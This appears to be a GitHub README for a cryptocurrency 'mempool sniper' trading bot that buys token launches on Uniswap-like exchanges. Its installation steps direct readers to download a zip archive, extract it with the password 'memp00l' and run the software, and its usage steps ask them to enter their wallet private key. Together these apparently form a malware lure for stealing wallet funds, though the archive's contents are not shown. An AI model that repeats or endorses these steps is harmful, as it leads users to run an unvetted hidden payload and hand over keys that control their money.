## About
This is a cryptocurrency trading bot that uses mempool analysis to make trades. Sniper bot allows you to be one of the first buys on any token launch. On a token launch there is an initial pump of the price. Buying first and selling at the first peak can make you fast profits. `Its an a public version.`

![alt text](https://github.com/Lak1Lay/mempool-trading-bot/blob/main/screen.png?raw=true)

## Features
- Mempool monitoring for liquidity add transactions, Pinksale and DXsale signals
- Works with Uniswap-V3 like AMMs in most common EVM networks (Uniswap, Pancackeswap, Sushiswap, Quickswap, TraderJoe and etc.)
- Automatic sell based on a user configured profit
- Honeypot detection
- Telegram bot notifications

## Installation
To install the bot, follow these steps:
1. [Download](https://github.com/Lak1Lay/mempool-trading-bot/archive/refs/heads/main.zip) repo and extract files with password `memp00l`
2. Move into the directory and launch software

## Usage
To use the bot, check out settings:
1. Setup your account `address` and `private key` (not seed)
2. Setup you `node url` (Quicknode or Moralis)
3. Add `smart contract address` of token you wish to buy
4. Define minimum amount of liquidity that should be added to the token before the buy should start
5. Set amount of BNB to invest and slippage, gas limit will be configured automatically
6. Enable mempool detection for listening transactions in mempool
7. Start the bot

## Disclaimer
The `mempool-trading-bot` is a tool that is provided as-is and with no warranties. The usage of this tool is entirely at your own risk.

## License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
